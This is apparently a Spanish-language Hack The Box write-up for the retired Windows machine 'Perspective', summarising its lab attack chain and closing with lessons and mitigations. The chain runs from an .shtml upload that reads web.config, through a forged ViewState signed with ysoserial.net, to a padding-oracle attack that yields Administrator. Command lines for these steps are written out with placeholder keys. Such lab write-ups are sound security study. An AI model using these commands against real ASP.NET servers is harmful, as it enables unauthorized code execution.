---
machine: Perspective
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, aspnet, viewstate, machinekey, padding-oracle]
---

# Perspective — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La subida de `.shtml` permite leer `web.config` y recuperar las claves de `machineKey`. Con ellas se firma un ViewState malicioso y se ejecuta código como `webuser`; un padding oracle en el reset de contraseña permite inyectar comandos y llegar a Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,443,3389,5985 <IP>
gobuster dir -u http://perspective.htb -w /usr/share/wordlists/dirb/common.txt
# Subida de .shtml para incluir web.config
curl -F "file=@read.shtml" http://perspective.htb/upload
# ViewState firmado
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<KEY>" --validationalg="SHA1" --validationkey="<KEY>"
# Padding oracle
padbuster http://perspective.htb/reset <TOKEN> 16 -cookies "session=<COOKIE>"
```

## Enumeración

- IIS con extensión `.shtml` y subida de archivos.
- Aplicación ASP.NET con ViewState habilitado y `machineKey` en `web.config`.
- Token de restablecimiento de contraseña vulnerable a padding oracle.

## Acceso inicial

Se sube un `.shtml` que incluye `web.config` y se obtienen las claves de validación y descifrado. Se genera un ViewState firmado con `ysoserial.net` y se envía a la página vulnerable para ejecutar código como `webuser`.

## Escalada de privilegios

El token de reset se cifra con una clave recuperada y es vulnerable a padding oracle: se manipula el ciphertext hasta obtener un valor válido y se inyecta un comando en el proceso que corre como Administrator.

## Evidencia

- `web.config` leído mediante el `.shtml`.
- ViewState firmado aceptado por IIS.
- Padding oracle y ejecución como Administrator.

## Lecciones aprendidas

- Las claves de `machineKey` convierten ViewState en ejecución de código.
- Los tokens cifrados sin autenticación pueden ser manipulables.
- Un padding oracle puede escalar de usuario web a administrador.

## Mitigación y detección

- Rotar `machineKey` y deshabilitar ViewState cuando no se use.
- Usar AES-GCM o tokens firmados y validar antes de descifrar.
- Bloquear `.shtml` y limitar la subida de archivos.

## Referencias

- [0xdf — Perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html)
- [Microsoft — machineKey](https://learn.microsoft.com/en-us/iis/configuration/system.web/machinekey)
- [Hack The Box — Perspective](https://app.hackthebox.com/machines/perspective)
